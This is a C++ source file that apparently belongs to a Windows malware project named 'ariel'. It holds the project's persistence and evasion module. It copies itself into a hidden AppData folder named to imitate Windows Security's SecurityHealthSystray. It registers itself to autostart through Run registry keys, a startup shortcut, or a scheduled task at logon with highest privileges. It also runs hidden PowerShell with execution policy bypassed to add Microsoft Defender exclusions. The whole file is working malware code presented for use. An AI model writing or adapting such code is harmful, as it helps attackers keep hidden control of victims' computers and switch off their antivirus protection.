#include "persist.hpp"

#include "util.hpp"

#include <windows.h>
#include <winreg.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <shlguid.h>

#include <algorithm>
#include <cwchar>
#include <fstream>
#include <vector>

namespace ariel::persist {

namespace {

bool write_shortcut(const util::fs::path& target, const util::fs::path& shortcut) {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    IShellLinkW* link = nullptr;
    const HRESULT created = CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
                                             __uuidof(IShellLinkW),
                                             reinterpret_cast<void**>(&link));
    if (FAILED(created)) {
        CoUninitialize();
        return false;
    }
    link->SetPath(target.c_str());
    link->SetWorkingDirectory(target.parent_path().wstring().c_str());

    IPersistFile* persist_file = nullptr;
    const HRESULT queried = link->QueryInterface(__uuidof(IPersistFile),
                                                 reinterpret_cast<void**>(&persist_file));
    bool saved = false;
    if (SUCCEEDED(queried)) {
        saved = SUCCEEDED(persist_file->Save(shortcut.c_str(), TRUE));
        persist_file->Release();
    }
    link->Release();
    CoUninitialize();
    return saved;
}

bool is_admin() {
    SID_IDENTIFIER_AUTHORITY authority = SECURITY_NT_AUTHORITY;
    PSID administrators = nullptr;
    if (!AllocateAndInitializeSid(&authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                  &administrators))
        return false;
    BOOL member = FALSE;
    const BOOL queried = CheckTokenMembership(nullptr, administrators, &member);
    FreeSid(administrators);
    return queried && member;
}

bool run_hidden(const std::wstring& command) {
    std::vector<wchar_t> mutable_command(command.begin(), command.end());
    mutable_command.push_back(L'\0');
    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESHOWWINDOW;
    startup.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION process{};
    if (!CreateProcessW(nullptr, mutable_command.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &startup, &process))
        return false;
    WaitForSingleObject(process.hProcess, 15000);
    DWORD exit_code = 0;
    const bool queried = GetExitCodeProcess(process.hProcess, &exit_code) && exit_code == 0;
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    return queried;
}

std::wstring escape_single_quotes(std::wstring value) {
    size_t position = 0;
    while ((position = value.find(L"'", position)) != std::wstring::npos) {
        value.replace(position, 1, L"''");
        position += 2;
    }
    return value;
}

std::wstring clean_component(const std::string& value, const wchar_t* fallback) {
    std::wstring result = util::from_utf8(value);
    const size_t first = result.find_first_not_of(L" \t\r\n");
    if (first == std::wstring::npos) return fallback;
    const size_t last = result.find_last_not_of(L" \t\r\n");
    result = result.substr(first, last - first + 1);
    for (wchar_t& c : result) {
        if (c < 0x20 || c == L'<' || c == L'>' || c == L':' || c == L'"' || c == L'/' ||
            c == L'\\' || c == L'|' || c == L'?' || c == L'*')
            c = L'_';
    }
    if (result.empty() || result == L"." || result == L"..") return fallback;
    return result;
}

std::wstring startup_file_name(const std::string& startup_name) {
    std::wstring name = clean_component(startup_name, L"SecurityHealthSystray.exe");
    if (name.size() < 4 || _wcsicmp(name.substr(name.size() - 4).c_str(), L".exe") != 0)
        name += L".exe";
    return name;
}

std::wstring run_value_name(const std::wstring& file_name) {
    if (file_name.size() > 4 && _wcsicmp(file_name.substr(file_name.size() - 4).c_str(), L".exe") == 0)
        return file_name.substr(0, file_name.size() - 4);
    return file_name;
}

}  // namespace

util::fs::path install_directory(const std::string& appdata_dir) {
    const std::wstring directory_name = clean_component(appdata_dir, L"SecurityHealthSystray");
    return util::fs::path(util::environment(L"APPDATA")) / directory_name;
}

bool install(const std::string& startup_name,
             const std::string& appdata_dir,
             const std::string& method,
             std::string& error) {
    wchar_t current[MAX_PATH]{};
    GetModuleFileNameW(nullptr, current, MAX_PATH);
    const util::fs::path source(current);

    const util::fs::path directory = install_directory(appdata_dir);
    std::error_code filesystem_error;
    util::fs::create_directories(directory, filesystem_error);
    SetFileAttributesW(directory.c_str(), FILE_ATTRIBUTE_HIDDEN);

    const std::wstring file_name = startup_file_name(startup_name);
    const util::fs::path target = directory / file_name;

    if (source != target) {
        std::error_code remove_error;
        if (util::fs::exists(target, remove_error))
            SetFileAttributesW(target.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (!CopyFileW(source.c_str(), target.c_str(), TRUE)) {
            error = "self-copy failed";
            return false;
        }
        SetFileAttributesW(target.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    const std::wstring value_name = run_value_name(file_name);
    const std::wstring launch = L"\"" + target.wstring() + L"\"";

    if (method == "task") {
        const std::wstring command =
            L"schtasks.exe /Create /TN \"" + value_name + L"\" /TR \"\\\"" + target.wstring() +
            L"\\\"\" /SC ONLOGON /RL HIGHEST /F";
        if (!run_hidden(command)) error = "scheduled task failed (admin required)";
        return error.empty();
    }

    if (method == "hklm") {
        HKEY key = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
            RegSetValueExW(key, value_name.c_str(), 0, REG_SZ,
                           reinterpret_cast<const BYTE*>(launch.c_str()),
                           static_cast<DWORD>((launch.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(key);
        } else {
            error = "HKLM Run key failed (admin required)";
        }
        return error.empty();
    }

    if (method != "user") {
        error = "unknown startup method";
        return false;
    }

    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        RegSetValueExW(key, value_name.c_str(), 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(launch.c_str()),
                       static_cast<DWORD>((launch.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(key);
    } else {
        error = "Run key failed";
    }

    wchar_t startup[MAX_PATH]{};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, SHGFP_TYPE_CURRENT, startup))) {
        if (!write_shortcut(target, util::fs::path(startup) / (value_name + L".lnk")) &&
            error.empty())
            error = "startup shortcut failed";
    } else if (error.empty()) {
        error = "startup folder unavailable";
    }

    return error.empty();
}

bool add_defender_exclusions(const std::vector<util::fs::path>& paths, std::string& error) {
    if (!is_admin()) {
        error = "administrator rights required";
        return false;
    }

    std::wstring script = L"$paths = @(";
    for (const auto& path : paths)
        script += L"'" + escape_single_quotes(path.wstring()) + L"',";
    script += L")\r\nforeach ($p in $paths) { if (Test-Path -LiteralPath $p) { "
              L"Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } }\r\n";

    std::wstring temp_directory(MAX_PATH, L'\0');
    const DWORD length = GetTempPathW(static_cast<DWORD>(temp_directory.size()),
                                      temp_directory.data());
    if (length == 0 || length > temp_directory.size()) {
        error = "temp path unavailable";
        return false;
    }
    temp_directory.resize(length);
    const auto script_path = util::fs::path(temp_directory) /
                             (L"ariel_exclusions_" + std::to_wstring(GetCurrentProcessId()) +
                              L"_" + std::to_wstring(GetTickCount64()) + L".ps1");

    std::wofstream script_file(script_path, std::ios::binary | std::ios::trunc);
    if (!script_file) {
        error = "script write failed";
        return false;
    }
    const wchar_t bom = 0xFEFF;
    script_file.write(&bom, 1);
    script_file.write(script.c_str(), static_cast<std::streamsize>(script.size()));
    script_file.close();

    std::wstring command = L"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-File \"" + script_path.wstring() + L"\"";
    std::vector<wchar_t> mutable_command(command.begin(), command.end());
    mutable_command.push_back(L'\0');

    STARTUPINFOW startup_info{};
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION process{};
    if (!CreateProcessW(nullptr, mutable_command.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process)) {
        error = "powershell launch failed";
        std::error_code cleanup;
        util::fs::remove(script_path, cleanup);
        return false;
    }

    WaitForSingleObject(process.hProcess, 15000);
    DWORD exit_code = 0;
    GetExitCodeProcess(process.hProcess, &exit_code);
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);

    std::error_code cleanup;
    util::fs::remove(script_path, cleanup);
    if (exit_code != 0) {
        error = "exclusion command failed";
        return false;
    }
    return true;
}

}  // namespace ariel::persist
